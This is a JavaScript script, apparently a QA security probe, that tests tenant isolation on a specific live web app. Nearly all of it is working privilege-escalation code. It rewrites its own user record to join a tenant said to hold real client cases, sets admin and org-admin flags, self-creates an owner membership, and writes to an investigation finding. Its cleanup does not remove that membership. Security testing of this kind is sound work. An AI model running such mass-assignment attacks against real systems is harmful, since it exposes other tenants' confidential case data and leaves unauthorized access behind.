// Security probe run as a provisioned TEST user (qa-security-test@example.com).
// Prints counts and pass/fail only — never record contents.
import fs from "node:fs";
const APP = "690cdf897b59e44d278ad008";
const API = `https://app.base44.com/api/apps/${APP}`;
const VICTIM_TENANT = "6aad68434c09c82f612a542f"; // workspace holding real client cases
const token = fs.readFileSync("/tmp/qa_token", "utf8").trim();
const H = { Authorization: `Bearer ${token}`, "X-App-Id": APP, "Content-Type": "application/json" };
const call = async (method, path, body) => {
  const r = await fetch(API + path, { method, headers: H, body: body ? JSON.stringify(body) : undefined });
  let j = null; try { j = await r.json(); } catch {}
  return { status: r.status, j };
};
const countCases = async () => {
  const r = await call("GET", "/entities/InvestigationCase?limit=500");
  return Array.isArray(r.j) ? r.j.length : `HTTP ${r.status}`;
};
const mode = process.argv[2] || "probe";
const me0 = await call("GET", "/entities/User/me");
console.log("me:", me0.status, "role=", me0.j?.role, "tenant_id=", me0.j?.tenant_id ?? null, "org_role=", me0.j?.organization_role ?? null, "is_admin=", me0.j?.is_admin ?? null);
if (mode === "cleanup") {
  const r = await call("PUT", "/entities/User/me", { tenant_id: null, organization_role: null, is_admin: false, tenant_role: null });
  console.log("cleanup updateMe:", r.status);
  process.exit(0);
}
console.log("cases visible BEFORE tamper:", await countCases());
const t1 = await call("PUT", "/entities/User/me", { tenant_id: VICTIM_TENANT });
console.log("ATTACK 1 set own tenant_id ->", t1.status, t1.status < 300 ? "ACCEPTED" : "REJECTED", t1.status >= 300 ? JSON.stringify(t1.j).slice(0, 160) : "");
const t2 = await call("PUT", "/entities/User/me", { is_admin: true });
console.log("ATTACK 2 set is_admin ->", t2.status, t2.status < 300 ? "ACCEPTED" : "REJECTED");
const t3 = await call("PUT", "/entities/User/me", { organization_role: "ORG_ADMIN" });
console.log("ATTACK 3 set organization_role ->", t3.status, t3.status < 300 ? "ACCEPTED" : "REJECTED");
const me1 = await call("GET", "/entities/User/me");
console.log("me after:", "tenant_id=", me1.j?.tenant_id ?? null, "org_role=", me1.j?.organization_role ?? null, "is_admin=", me1.j?.is_admin ?? null);
console.log("cases visible AFTER tamper:", await countCases());
const m = await call("POST", "/entities/TenantMembership", { tenant_id: VICTIM_TENANT, user_id: me0.j?.id, role: "owner", organization_role: "ORG_ADMIN", status: "active", description: "QA security probe — delete" });
console.log("ATTACK 4 self-create ORG_ADMIN membership ->", m.status, m.status < 300 ? `ACCEPTED id=${m.j?.id}` : "REJECTED");
const f = await call("GET", "/entities/InvestigationFinding?limit=1");
if (Array.isArray(f.j) && f.j[0]) {
  const u = await call("PUT", `/entities/InvestigationFinding/${f.j[0].id}`, { review_notes: f.j[0].review_notes ?? "" });
  console.log("ATTACK 5 edit a finding (no-op write) ->", u.status, u.status < 300 ? "ACCEPTED" : "REJECTED");
} else console.log("ATTACK 5 edit a finding -> no readable finding");
